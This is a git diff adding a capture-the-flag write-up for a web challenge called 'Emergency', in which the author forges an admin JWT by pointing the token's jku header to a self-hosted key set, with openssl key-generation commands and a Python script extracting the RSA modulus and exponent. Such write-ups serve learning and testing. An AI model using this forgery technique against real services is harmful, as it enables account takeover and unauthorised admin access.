@@ -84,3 +84,33 @@ Extract Data From AllNotes
 ![NoteQL Solved](img/noteql_solved.png)
 
 ## Emergency - Web
+The goal is to login as admin.  
+We can register at the website so I registered account, login and check the cookie, found that it is jwt token.
+![JWT](img/jwt_token.png)
+So I gonna set my own `jku` and create a cookie.  
+Generate key for making own jwt token.
+```bash
+openssl genrsa -out keypair.pem 2048
+openssl rsa -in keypair.pem -pubout -out publickey.crt
+openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
+```
+Then generate JWT token using the pkcs8.key, use publickey.crt to verify the signature. Change JKU to your server.  
+![Generate JWT](img/generate_jwt.png)
+We have to make our own JKU so, take the JKU from challenge server.  
+Original JKU
+```json
+{"keys":[{"alg":"RS256","e":"65537","kid":"aedd40bb-c3e1-484c-9276-9dfd9851cff3","kty":"RSA","n":"24804136272110884170787839867509396323230452724341294178183865340492552954568132005519367025541596752921431623049627351835958562122544540080932545251349061259190325088018724836377533549565932185384077836949817646469726711414100682617069656975777881198841775915669087389236050322091575593991507323447213865777691048813484082833092035860079907820032850768679758581620645163333756575988255800385896460143061616854956663179672176444743239709864328164790358766944504024227158890339579832048468543075523470250598988834568422544922488008415048354329034383653634008293324332102176778049993377105382177352682734886146530780521","use":"sig"}]}
+```
+We need `e` and `n`, so I gonna generate this.
+```python
+from Crypto.PublicKey import RSA
+
+fp = open("publickey.crt", "r")
+key = RSA.importKey(fp.read())
+fp.close()
+
+print "n:", int(key.n)
+print "e:", int(key.e)
+```
+That is all, copy the jwt token and replace in cookie.
+![Emergency Solved](img/generate_jwt.png)
